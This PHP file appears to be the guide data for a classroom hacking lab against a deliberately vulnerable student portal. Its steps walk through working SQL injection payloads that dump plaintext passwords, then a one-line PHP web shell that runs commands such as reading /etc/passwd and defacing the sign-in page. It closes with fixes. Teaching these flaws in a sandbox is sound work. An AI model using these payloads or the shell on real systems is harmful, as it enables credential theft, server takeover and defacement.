<?php
/* Guided walkthrough. Lab harness, not part of the UAM Student Portal. */

/* Payloads that point at a file this player uploaded need this player's
 * own sandbox, which is different in every browser in the room. Built
 * from the request itself so it is correct on whatever host/port this
 * copy is actually served from. */
$ss_scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$u = $ss_scheme . '://' . $_SERVER['HTTP_HOST'] . '/' . ss_inst_url();

$GUIDE = [
'intro' => 'Two mistakes, one behind the other. The "Check application status" box on the sign-in page builds its SQL by gluing your text into it, and the avatar form on your profile saves whatever you hand it into a folder the server will execute. The first gives you the administrator\'s password. The second is waiting behind the administrator\'s own login.<br><br>There is no sign-up on this portal - accounts are issued by the Registrar\'s Office, same as a real campus SSO. You do not need an account for any of this: the SQL injection below is reachable from the sign-in page with nobody logged in at all.',
'steps' => [

['t' => 'Search for something normal',
 'b' => '<p>On the sign-in page, find <strong>Check application status</strong>. Type a name fragment and press <strong>Check status</strong>.</p>',
 'try' => [
     'Applicant name' => 'a',
 ],
 'see' => 'A few rows. Your text travelled into the database and came back as results. Hold on to that: it <em>went into</em> the database.',
],

['t' => 'Send one apostrophe',
 'b' => '<p>Clear the box. Type a single <code>\'</code> and press Check status.</p>',
 'try' => [
     'Applicant name' => '\'',
 ],
 'see' => 'A red <strong>SQL error</strong> - the database\'s own complaint, printed on the page. That only happens if your text arrived as part of the instruction instead of as data.',
],

['t' => 'See what you are standing inside',
 'b' => '<p>The page builds its query by pasting your text straight in:</p><pre><code>... WHERE us.username LIKE \'%YOUR TEXT%\' ORDER BY a.id DESC</code></pre><p>Your apostrophe closed that string early and the leftovers stopped making sense.</p><p>So do it on purpose: close the string, write your own SQL, and comment the leftovers away with <code>-- -</code>.</p>',
 'see' => 'Nothing yet. Every payload below is that same shape.',
],

['t' => 'Count the columns',
 'b' => '<p>To bolt your own row on, you must match the number of columns the page already selects. Ask it to sort by column 5, then by column 6.</p>',
 'try' => [
     'Five' => '\' ORDER BY 5 -- -',
     'Six' => '\' ORDER BY 6 -- -',
 ],
 'see' => 'Five sorts fine. Six answers <code>Unknown column \'6\' in \'order clause\'</code>. So there are exactly five.',
],

['t' => 'Add a row of your own',
 'b' => '<p><code>UNION SELECT</code> joins a second set of results onto the first. Five columns, so five values.</p><p>Start the name with <code>zzz</code>, which matches no real applicant. Then the only row left on screen is the one you added.</p>',
 'try' => [
     'Applicant name' => 'zzz\' UNION SELECT 1,2,3,4,5 -- -',
 ],
 'see' => 'One row, and it is not an application anybody filed. The numbers you can read are the columns that reach the screen - <strong>2</strong> under Applicant and <strong>5</strong> under Date.',
],

['t' => 'Ask the database about itself',
 'b' => '<p>Swap the numbers you can see for questions.</p>',
 'try' => [
     'Applicant name' => 'zzz\' UNION SELECT 1,database(),3,4,version() -- -',
 ],
 'see' => 'The Applicant column now reads <code>uam_db</code>, and the Date column reads the server version. You are choosing what the page prints - and what it prints does not have to fit the column it lands in.',
],

['t' => 'List the tables',
 'b' => '<p>Every MySQL server keeps a description of itself in <code>information_schema</code>. <code>GROUP_CONCAT</code> folds many rows into one so they fit in a single field.</p>',
 'try' => [
     'Applicant name' => 'zzz\' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database() -- -',
 ],
 'see' => 'The whole table list, <code>users</code> among them.',
],

['t' => 'List the columns of users',
 'b' => '<p>Same question, one level down. <code>table_schema=database()</code> keeps the answer to this site\'s own tables - the server has internal ones called <code>users</code> too.</p>',
 'try' => [
     'Applicant name' => 'zzz\' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name=\'users\' AND table_schema=database() -- -',
 ],
 'see' => '<code>username</code> and <code>password</code> are both there. Nothing is stopping you asking for them.',
],

['t' => 'Read every username and password',
 'b' => '<p>One row per account: the Applicant column is the username, the Date column holds the password - not a date at all, just whatever you told the page to print there.</p>',
 'try' => [
     'Applicant name' => 'zzz\' UNION SELECT 1,username,3,4,password FROM users -- -',
 ],
 'see' => 'Forty-two accounts, and their passwords are <strong>just sitting there</strong>. Not hashes to crack - the passwords. Page through them and notice how many are the same.',
],

['t' => 'Take the administrator\'s',
 'b' => '<p>Narrow it to the one account that matters.</p>',
 'try' => [
     'Applicant name' => 'zzz\' UNION SELECT 1,username,3,4,password FROM users WHERE is_admin=1 -- -',
 ],
 'see' => '<code>admin</code> and its password. It is not a weak password. It did not need to be.',
],

['t' => 'Sign in as the administrator',
 'b' => '<p>Scroll up to the <strong>Sign in</strong> form on this same page. Username <code>admin</code>, password the one you just read off the screen.</p>',
 'see' => 'You are the administrator. A <strong>DASHBOARD</strong> loads, and an <strong>ADMIN</strong> tab appears in the navigation. The SQL injection is over - everything after this is just being logged in.',
],

['t' => 'Find somewhere to put a file',
 'b' => '<p>Go to <strong>PROFILE</strong>, then <strong>Edit profile</strong>.</p>',
 'see' => 'An avatar form. It takes a file and says nothing about what kind of file.',
],

['t' => 'Write a one-line web shell',
 'b' => '<p>Make a file on your own computer called <code>shell.php</code> holding exactly this:</p>',
 'try' => [
     'shell.php' => '<?php system($_GET[\'c\']); ?>',
     '--1' => '<strong>Windows:</strong> Notepad, then Save as, and set <em>Save as type</em> to <em>All files</em> so it does not become shell.php.txt.',
     '--2' => '<strong>Mac:</strong> TextEdit, then Format &rarr; Make Plain Text before you save.',
     '--3' => '<strong>Linux or a terminal:</strong> <code>nano shell.php</code>, paste, <strong>Ctrl+O</strong> then <strong>Enter</strong> to save, <strong>Ctrl+X</strong> to leave.',
 ],
 'see' => 'A text file, nineteen characters long. It takes whatever you put in <code>c</code> and runs it as a command on the server.',
],

['t' => 'Upload it',
 'b' => '<p>Back on <strong>Edit profile</strong>, choose <code>shell.php</code> and press <strong>Upload avatar</strong>.</p>',
 'see' => 'A message saying where it saved. No complaint about the extension, because nothing looked at it. Your broken avatar is a PHP file now.',
],

['t' => 'Run a command',
 'b' => '<p>Open the file you just uploaded, and put a command in <code>c</code>.</p>',
 'try' => [
     'Open in the address bar' => $u . '/shell.php?c=id',
 ],
 'see' => '<code>uid=33(www-data) gid=33(www-data)</code>. That is not your browser talking - that is the server running your command and reading the answer back to you.',
],

['t' => 'Look around',
 'b' => '<p>Change the command. Anything the web server user can do, you can now do.</p>',
 'try' => [
     'What is in here' => $u . '/shell.php?c=ls -la',
     'Who lives on this box' => $u . '/shell.php?c=cat /etc/passwd',
 ],
 'see' => 'A directory listing, then the account list. This is the moment the bug stops being about one page.',
],

['t' => 'Deface the sign-in page',
 'b' => '<p>Write a new sign-in page. The shell runs in its own folder, so <code>home.html</code> lands where the site will find it.</p>',
 'try' => [
     'Run' => $u . '/shell.php?c=echo "<h1>OWNED BY WEEK 1</h1>" > home.html',
     '--1' => 'Now open the portal\'s sign-in page.',
 ],
 'see' => 'The sign-in page is gone. That is the <strong>I</strong> in the CIA triad - integrity - and it is the version of this your users notice.',
],

['t' => 'Put it back',
 'b' => '<p>Click <strong>RESTORE SIGN-IN PAGE</strong> in the corner.</p>',
 'see' => 'The sign-in page returns. Your shell is still there. Only you ever saw the defacement - everyone else in the room gets to do it themselves.',
],
],
'after' => '<p>Neither bug is exotic. The status-check box trusts text to stay text, and the upload form trusts a filename to describe its contents. Both are decades old and both are still shipping.</p><p>What made it a bad day was the order. Reading the database would have been a report on its own; reading <em>plain text passwords</em> turned it into a key. Hashing would not have stopped the injection - it would have stopped the injection from mattering.</p><p>Three fixes, each one sufficient to break the chain:</p><p><strong>1.</strong> Bind the parameter. Pass the search term as a value, not as part of the query, and every payload above becomes a result nobody has.</p><p><strong>2.</strong> Hash the passwords. The dump still happens and is still a breach, but nobody signs in with it.</p><p><strong>3.</strong> Store uploads outside the web root, rename them, and never let the server execute what a user sent. Then a PHP file is just a file.</p>',
];
